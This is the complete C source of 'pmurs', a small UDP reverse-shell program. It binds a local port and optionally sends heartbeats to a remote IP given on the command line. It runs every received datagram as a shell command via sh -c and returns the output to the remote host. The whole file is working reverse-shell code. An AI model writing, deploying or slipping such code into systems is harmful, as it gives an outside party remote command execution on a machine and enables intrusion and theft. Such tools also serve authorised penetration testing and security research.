/*
* pmurs: Poor Man's UDP Reverse Shell
* Copyright (C) 2016 Iñaki Ucar
*
* This program is free software; you can redistribute it and/or modify
* it under the terms of the Community Research and Academic Programming
* License (CRAPL) as published by Matthew Might; either version 0, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
* CRAPL for more details.
*
* You should have received a copy of the CRAPL along with this program;
* if not, visit http://matt.might.net
*/

#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

static int sockfd, cpid1, cpid2;
static struct addrinfo *dstinfo, *srcinfo;

void clean() {
  if (dstinfo)
    freeaddrinfo(dstinfo);
  if (srcinfo)
    freeaddrinfo(srcinfo);
  close(sockfd);
}

void clean_and_exit(char *e) {
  clean();
  if (cpid1 > 0)
    kill(cpid1, SIGKILL);
  if (cpid2 > 0)
    kill(cpid2, SIGKILL);
  perror(e);
  exit(1);
}

void catch_child(int sig_num) {
    int child_status;
    wait(&child_status);
}

int main(int argc, char *argv[]) {
  struct addrinfo hints, *p = NULL;
  int ret, heartbeat = -1;
  char buffer[1000];

  if (argc < 4) {
    fprintf(stderr,"usage: %s <remote_IP> <remote_PORT> <local_PORT> [heartbeat_interval]\n", argv[0]);
    exit(1);
  }

  if (argc > 4) heartbeat = atoi(argv[4]);

  // source address
  memset(&hints, 0, sizeof hints);
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_DGRAM;
  hints.ai_flags = AI_PASSIVE;
  if ((ret = getaddrinfo(NULL, argv[3], &hints, &srcinfo)) != 0)
    clean_and_exit("getaddrinfo");

  // destination address
  memset(&hints, 0, sizeof hints);
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_DGRAM;
  if ((ret = getaddrinfo(argv[1], argv[2], &hints, &dstinfo)) != 0)
    clean_and_exit("getaddrinfo");

  // open socket, bind and connect
  for (p = dstinfo; p != NULL; p = p->ai_next) {
    if ((sockfd = socket(p->ai_family, p->ai_socktype,
                p->ai_protocol)) == -1) {
      perror("socket");
      continue;
    }
    break;
  }
  if (p == NULL)
    clean_and_exit("socket");
  if ((ret = bind(sockfd, srcinfo->ai_addr, srcinfo->ai_addrlen)) != 0)
    clean_and_exit("bind");

  // catch signals to free resources
  signal(SIGCHLD, catch_child);

  // fork heartbeat
  if (heartbeat > 0) switch ((cpid1 = fork())) {
  case -1:
    clean_and_exit("fork");
  case 0:
    while (1) {
      sendto(sockfd, HEARTBEAT, sizeof(HEARTBEAT), 0,
             p->ai_addr, p->ai_addrlen);
      sleep(heartbeat);
    }
  }

  while (1) {
    memset(buffer, 0, sizeof(buffer));
    if ((ret = recvfrom(sockfd, buffer, sizeof(buffer), 0,
                        p->ai_addr, &p->ai_addrlen)) < 0)
      continue;

    switch ((cpid2 = fork())) {
    case -1:
      sendto(sockfd, "error: command not executed\n", 28, 0,
             p->ai_addr, p->ai_addrlen);
      break;
    case 0:
      if ((ret = connect(sockfd, p->ai_addr, p->ai_addrlen)) != 0) {
        sendto(sockfd, "error: command not executed\n", 28, 0,
               p->ai_addr, p->ai_addrlen);
        clean();
        return -1;
      }
      dup2(sockfd, 0);
      dup2(sockfd, 1);
      dup2(sockfd, 2);
      execl(TARGET_SHELL, "sh", "-c", buffer, NULL);
    }
  }

  return 0;
}
